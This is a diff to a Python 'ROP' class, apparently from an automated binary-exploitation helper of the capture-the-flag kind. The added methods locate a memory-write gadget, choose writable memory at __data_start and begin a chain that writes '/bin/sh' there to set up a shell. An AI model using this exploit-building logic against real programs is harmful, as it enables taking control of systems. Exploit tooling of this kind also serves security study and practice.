@@ -163,16 +163,27 @@ class ROP:
     def satisfy_win(self):
         return self.fill_reg("rdi", int(self.analysis.get_win_arg(), 16))
     
-    def get_primitives(self):
+    def get_primitives_str(self):
         for i in self.gadgets:
             if 'qword ptr [' in i and 'mov' in i:
                 return i
         return None
-    
+    def get_primitives(self):
+        return p64(int(self.get_primitives_str().split(':')[0],16))
+
     # 0th is write_mem, 1st is other adddr
     def get_primitive_regs(self):
-        prim = self.get_primitives().split('mov qword ptr')[1].split(';')[0][2:].split(',')
+        prim = self.get_primitives_str().split('mov qword ptr')[1].split(';')[0][2:].split(',')
         return [prim[0][:2], prim[1]]
+    def get_writeable_mem(self):
+        return self.elf.sym['__data_start']
+
+    def do_the_thing(self):
+        ret = b''
+        ret += self.fill_reg(self.get_primitive_regs()[0], self.get_writeable_mem())
+        ret += self.fill_reg(self.get_primitive_regs()[1], '/bin/sh\0')
+        return ret
+            
 
 class Get2overflow:
     def __init__(s, binary):
